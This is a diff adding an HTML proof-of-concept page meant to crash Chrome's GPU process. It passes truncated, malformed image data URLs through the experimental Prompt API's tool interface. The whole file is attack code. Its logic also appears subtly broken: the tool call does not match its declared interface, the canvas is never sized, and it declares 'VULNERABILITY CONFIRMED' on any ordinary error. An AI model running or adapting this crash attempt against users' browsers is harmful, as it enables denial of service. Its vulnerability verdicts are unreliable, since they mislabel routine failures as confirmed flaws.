@@ -1,0 +1,129 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <title>GPU Process Crash PoC</title>
+    <style>
+        body { font-family: Arial, sans-serif; margin: 20px; }
+        #log { white-space: pre-wrap; font: 12px/1.4 monospace; border: 1px solid #ccc; padding: 10px; height: 300px; overflow-y: scroll; }
+        .critical { color: #dc3545; font-weight: bold; }
+        .warning { color: #fd7e14; }
+        .info { color: #0dcaf0; }
+        button { padding: 10px 20px; margin: 5px; font-size: 16px; }
+    </style>
+</head>
+<body>
+    <h2>GPU Process Crash Detection PoC</h2>
+    <p><strong>Warning:</strong> This test may crash your browser tab or GPU process</p>
+    <button onclick="triggerGPUStressTest()">Trigger GPU Stress Test</button>
+    <button onclick="clearLog()">Clear Log</button>
+    <div id="log"></div>
+    <script>
+        const log = (msg, className = '') => {
+            const logEl = document.getElementById('log');
+            const timestamp = new Date().toLocaleTimeString();
+            const line = document.createElement('div');
+            line.textContent = `[${timestamp}] ${msg}`;
+            if (className) line.className = className;
+            logEl.appendChild(line);
+            logEl.scrollTop = logEl.scrollHeight;
+        };
+        const clearLog = () => {
+            document.getElementById('log').innerHTML = '';
+        };
+        // Malformed image data designed to trigger GPU process issues
+        const corruptedImageCorpus = [
+            'data:image/webp;base64,UklGRiIAAABXRUJQVlA4WAoAAAAQAAAADwAABwAAQUxQSAwA',
+            'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAAB',
+            'data:image/jpeg;base64,/9j/4AAQSkZJRgABAQEASABIAAD/2wBD',
+            'data:image/webp;base64,UklGRh4AAABXRUJQVlA4TBEAAAAvAAAAABcBaQAA/gAA'
+        ];
+        async function triggerGPUStressTest() {
+            log('=== GPU Process Stress Test Starting ===', 'info');
+            
+            if (!window.ai?.languageModel) {
+                log('❌ Prompt API not available. Enable --enable-features=PromptApiForGeminiNano', 'critical');
+                return;
+            }
+            log('✓ Prompt API detected', 'info');
+            const startTime = performance.now();
+            let crashDetected = false;
+            const crashTimer = setTimeout(() => {
+                if (!crashDetected) {
+                    log('⚠️ Browser became unresponsive - potential GPU process crash detected', 'critical');
+                    crashDetected = true;
+                }
+            }, 15000);
+            try {
+                const tools = [{
+                    name: 'process_image_gpu',
+                    description: 'Processes image through GPU pipeline',
+                    function: async (bitmap) => {
+                        log(`Processing image bitmap: ${bitmap.width}x${bitmap.height}`, 'info');
+                        const canvas = document.createElement('canvas');
+                        const ctx = canvas.getContext('2d');
+                        try {
+                            ctx.drawImage(bitmap, 0, 0);
+                            const imageData = ctx.getImageData(0, 0, canvas.width, canvas.height);
+                            ctx.putImageData(imageData, 0, 0);
+                            return `Processed ${bitmap.width}x${bitmap.height} image`;
+                        } catch (e) {
+                            log(`⚠️ Canvas operation failed: ${e.message}`, 'warning');
+                            throw e;
+                        }
+                    }
+                }];
+                const model = await window.ai.languageModel.create({ tools });
+                log('✓ AI model created with image processing tool', 'info');
+                for (let i = 0; i < corruptedImageCorpus.length; i++) {
+                    const imgData = corruptedImageCorpus[i];
+                    log(`\n--- Testing corrupted image ${i + 1}/${corruptedImageCorpus.length} ---`, 'info');
+                    try {
+                        const response = await fetch(imgData);
+                        const blob = await response.blob();
+                        log(`Created blob: ${blob.size} bytes, type: ${blob.type}`, 'info');
+                        const bitmap = await createImageBitmap(blob).catch(e => {
+                            log(`ImageBitmap creation failed: ${e.message}`, 'warning');
+                            return null;
+                        });
+                        if (bitmap) {
+                            log(`Created ImageBitmap: ${bitmap.width}x${bitmap.height}`, 'info');
+                            await model.execute({
+                                tool: 'process_image_gpu',
+                                image: bitmap
+                            });
+                            log(`✓ Image ${i + 1} processed successfully`, 'info');
+                        }
+                    } catch (e) {
+                        log(`🚨 CRASH/ERROR on image ${i + 1}: ${e.message}`, 'critical');
+                        log(`This may indicate GPU process instability`, 'critical');
+                        crashDetected = true;
+                        break;
+                    }
+                    await new Promise(resolve => setTimeout(resolve, 500));
+                }
+            } catch (e) {
+                log(`🚨 FATAL ERROR: ${e.message}`, 'critical');
+                log('This likely indicates a GPU process crash', 'critical');
+                crashDetected = true;
+            }
+            clearTimeout(crashTimer);
+            const duration = performance.now() - startTime;
+            log(`\n=== Test Completed in ${duration.toFixed(2)}ms ===`, 'info');
+            if (crashDetected) {
+                log('🚨 VULNERABILITY CONFIRMED: GPU process instability detected', 'critical');
+                log('Check chrome://crashes for crash reports', 'critical');
+            } else {
+                log('✓ GPU process appears stable (no vulnerability detected)', 'info');
+            }
+        }
+        window.addEventListener('load', () => {
+            if (window.ai) {
+                log('Prompt API detected. Ready to test GPU process stability.');
+            } else {
+                log('Prompt API not detected. Launch Chrome with --enable-features=PromptApiForGeminiNano', 'warning');
+            }
+        });
+    </script>
+</body>
+</html> 
